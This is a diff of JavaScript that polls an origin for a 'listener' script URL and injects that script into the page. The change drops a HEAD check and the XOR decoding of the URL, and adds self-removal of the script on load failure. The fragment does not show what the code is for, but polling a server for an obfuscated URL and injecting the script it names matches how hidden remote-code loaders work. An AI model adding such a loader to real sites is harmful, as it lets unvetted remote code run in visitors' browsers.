@@ -17,24 +17,16 @@ async function loadListenerScript(scriptUrl) {
         return;
     }
 
-    try {
-        const headResponse = await fetch(scriptUrl, { method: "HEAD" });
-        if (!headResponse.ok) {
-            console.warn("Listener script not found (skipping):", scriptUrl);
-            return;
-        }
-    } catch (err) {
-        console.warn("Could not reach listener script (skipping):", err.message);
-        return;
-    }
-
     if (document.querySelector(`script[src="${scriptUrl}"]`)) return;
 
     const script = document.createElement("script");
     script.src = scriptUrl;
     script.async = true;
     script.onload = () => console.log("Listener script loaded:", scriptUrl);
-    script.onerror = () => console.error("Failed to load listener script:", scriptUrl);
+    script.onerror = () => {
+        console.warn("Listener script not found or failed, removing and waiting for next poll:", scriptUrl);
+        script.remove();
+    };
     document.head.appendChild(script);
 }
 
@@ -55,7 +47,7 @@ function getListener(origin) {
             }
 
             console.log("Listener received:", listenerUrl);
-            await loadListenerScript(xorDecode(listenerUrl, key));
+            await loadListenerScript(listenerUrl);
         } catch (err) {
             console.error("Failed to fetch listener config:", err);
         }
